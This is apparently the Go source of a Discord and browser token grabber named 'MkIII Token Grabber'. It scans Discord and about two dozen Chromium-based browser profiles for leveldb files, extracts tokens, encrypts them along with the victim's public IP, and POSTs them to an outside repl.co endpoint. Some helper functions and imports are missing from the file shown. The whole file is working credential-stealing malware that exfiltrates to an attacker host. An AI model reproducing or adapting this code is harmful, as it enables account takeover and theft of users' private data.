/* This package is to be compiled for Win32 or Win64 based Systems.

MkIII Token Grabber
(c) 2021 Studio 7 Development

> Go Implementation
*/

package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"sync"
)

func DumpService() []string {
	hdir, _ := os.UserHomeDir()

	var HOME string = hdir + "/.config"

	var WG sync.WaitGroup

	var T []string

	PLATFORMS := [27]string{
		HOME + "/discord",
		HOME + "/discordcanary",
		HOME + "/discordptb",
		HOME + "/Google/Chrome/User Data/Default",
		HOME + "/Opera Software/Opera Stable",
		HOME + "/Opera Software/Opera GX Stable",
		HOME + "/BraveSoftware/Brave-Browser/User Data/Default",
		HOME + "/Yandex/YandexBrowser/User Data/Default",
		HOME + "/Chromium/User Data/Default",
		HOME + "/Epic Privacy Browser/User Data/Default",
		HOME + "/Amigo/User Data/Default",
		HOME + "/Vivaldi/User Data/Default",
		HOME + "/Orbitum/User Data/Default",
		HOME + "/Mail.Ru/Atom/User Data/Default",
		HOME + "/Kometa/User Data/Default",
		HOME + "/Comodo/Dragon/User Data/Default",
		HOME + "/Torch/User Data/Default",
		HOME + "/Comodo/User Data/Default",
		HOME + "/Slimjet/User Data/Default",
		HOME + "/360Browser/Browser/User Data/Default",
		HOME + "/Maxthon3/User Data/Default",
		HOME + "/K-Melon/User Data/Default",
		HOME + "/Sputnik/Sputnik/User Data/Default",
		HOME + "/Nichrome/User Data/Default",
		HOME + "/CocCoc/Browser/User Data/Default",
		HOME + "/uCozMedia/Uran/User Data/Default",
		HOME + "/Chromodo/User Data/Default",
	}

	for _, PLATFORM := range PLATFORMS {
		if _, err := os.Stat(PLATFORM); os.IsNotExist(err) {
			continue
		}

		PLATFORM_PATH := PLATFORM + "/Local Storage/leveldb/"
		items, _ := ioutil.ReadDir(PLATFORM_PATH)
		for _, File := range items {
			FName := File.Name()
			var t []string
			if File.IsDir() || (!strings.HasSuffix(FName, ".log") && !strings.HasSuffix(FName, ".ldb")) {
				continue
			}

			// Do stuff here
			WG.Add(1)
			go func(FName string) {
				defer WG.Done()

				b, e := os.ReadFile(PLATFORM_PATH + FName)
				if e != nil {
					log.Fatalf(e.Error())
				}

				t = FindAll(string(b))

				if len(t) > 0 {
					T = append(T, t...)
				}
			}(FName)
		}
		WG.Wait()
	}
	return T
}

func main() {
	resp, _ := http.Get("https://myexternalip.com/raw")
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)

	// Log the request body
	ip := string(body)
	HashKey := RandIntBytes(3)
	HashKeyInt, _ := strconv.Atoi(HashKey)

	GenerateHeaders()

	hash, nonce := CryptSign(ip, HashKey)

	HEADERS[HashKeyInt] = nonce

	//fmt.Println(HEADERS)

	var p string = "{"

	for i := 0; i < 999; i++ {
		if i == 998 {
			p = p + "\"" + fmt.Sprintf("%03d", i) + "\":\"" + HEADERS[i] + "\""
			continue
		}
		p = p + "\"" + fmt.Sprintf("%03d", i) + "\":\"" + HEADERS[i] + "\","

	}
	p = p + "}"

	T := strings.Join(DumpService(), "%BREAK%")
	var t string
	if len(T) < 16 {
		t = strings.ReplaceAll(strings.ReplaceAll(fmt.Sprintf("% 16d", T), "%!d(string=", ""), ")", "")
	} else {
		t = T
	}

	endpoint := Encrypt(t, strings.Join(strings.Split(hash, "")[0:32], ""))
	req, _ := http.NewRequest("POST", "https://liveton.studio7.repl.co/go/"+fmt.Sprintf("%03d", len(ToString(endpoint)))+strings.TrimRight(ToString(endpoint), "0")+HashKey, bytes.NewBuffer([]byte(p)))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	client.Do(req)

}
